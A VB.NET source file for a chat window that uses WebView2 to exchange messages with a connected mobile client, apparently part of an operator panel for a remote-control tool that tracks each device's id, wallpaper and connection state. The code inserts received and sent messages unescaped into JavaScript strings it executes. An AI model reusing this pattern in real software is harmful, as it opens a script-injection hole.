Imports System.Runtime.InteropServices

Public Class Chat

    <ComVisible(True)>
    Public Class mybridge
        Public mainform As Chat
        Sub New(minme As Chat)
            mainform = minme
        End Sub

        <DispId(1)>
        Public Function sendit(msg As String)
            ' MsgBox(clientid)
            mainform.sendtoclient(msg)
            Return ""

        End Function
        Public Function closeme()
            mainform.Close()
            Return ""

        End Function
    End Class


    Private adminname As String = Nothing
    Public Btcli As BTClient = Nothing

    Sub New(title As String)


        InitializeComponent()


        adminname = title
    End Sub

    Public Async Sub AppendToChat(isFromClient As Boolean, message As String)

        If isFromClient Then
            Await Chatview.CoreWebView2.ExecuteScriptAsync($"insertReceiverMessage(`{message}`);")
        Else
            Await Chatview.CoreWebView2.ExecuteScriptAsync($"insertSenderMessage(`{message}`);")
        End If

    End Sub





    Private Sub sendtoclient(themsg As String)
        If isEmpty(themsg) Then
            Return
        End If

        Dim newmsg As String = themsg
        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "chat"},
                             {"data", newmsg},
                             {"title", adminname}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        AppendToChat(False, newmsg)


    End Sub

    Private Async Sub Chat_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        Await Chatview.EnsureCoreWebView2Async()


        AddHandler Chatview.NavigationCompleted, AddressOf WebView_NavigationCompleted


        Chatview.NavigateToString(My.Resources.btchat)

        Dim term As New mybridge(Me)
        Chatview.CoreWebView2.AddHostObjectToScript("mybridge", term)

        Chatview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = False
        Chatview.CoreWebView2.Settings.AreDevToolsEnabled = False




        Me.myico.Image = Btcli.wallpaper
        'Me.myscr.Image = Btcli.screen
        Me.mytitle.Text = Btcli.name
        statetimer.Start()
    End Sub
    Private Async Sub WebView_NavigationCompleted(sender As Object, e As Microsoft.Web.WebView2.Core.CoreWebView2NavigationCompletedEventArgs)
        ' Await Chatview.CoreWebView2.ExecuteScriptAsync($"updateUserInfo(`{BitmapToBase64(Btcli.wallpaper)}`,`{Btcli.name}`);")
    End Sub
    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myico.Image = Btcli.wallpaper

                Me.mytitle.Text = Btcli.name

            Else
                Me.myico.Image = My.Resources.no_con
                Me.mytitle.Text = BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub



    Private Async Sub Chatview_KeyDown(sender As Object, e As KeyEventArgs) Handles Chatview.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            Await Chatview.CoreWebView2.ExecuteScriptAsync($"sendMessage();")

        End If

    End Sub

    Private Sub mytitle_MouseDown(sender As Object, e As MouseEventArgs) Handles mytitle.MouseDown, myico.MouseDown
        Try
            If e.Button = Windows.Forms.MouseButtons.Left Then
                ReleaseCapture()
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub sndbtn_Click(sender As Object, e As EventArgs) Handles sndbtn.Click
        Me.Close()
    End Sub

    Private Async Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        Await Chatview.CoreWebView2.ExecuteScriptAsync($"clearChat();")
    End Sub
End Class